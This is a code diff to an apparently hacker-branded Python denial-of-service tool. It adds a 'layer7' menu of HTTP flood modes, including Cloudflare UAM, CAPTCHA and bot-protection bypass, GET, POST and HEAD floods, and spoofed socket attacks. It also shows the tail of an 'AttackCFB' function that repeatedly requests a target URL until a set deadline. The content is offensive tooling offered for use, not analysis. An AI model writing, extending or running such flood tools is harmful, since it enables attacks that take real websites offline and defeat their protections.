@@ -505,7 +505,23 @@ def AttackCFB(url, until_datetime, scraper):
             scraper.get(url, timeout=15)
         except:
             pass
-## Func class #
+##############################################################################################
+def layer7():
+    clear()
+    tprint("Katty Meow! L7\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfreq  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pps    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Only GET / HTTP/1.1                      "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n")
+    stdout.write("\n")
 ###############################Main Commands##################################################
 def command():
     stdout.write(Fore.LIGHTCYAN_EX+"╔═══"+Fore.LIGHTCYAN_EX+"[""L4merz"+Fore.LIGHTGREEN_EX+"@"+Fore.LIGHTCYAN_EX+"Kattymad"+Fore.CYAN+"]"+Fore.LIGHTCYAN_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
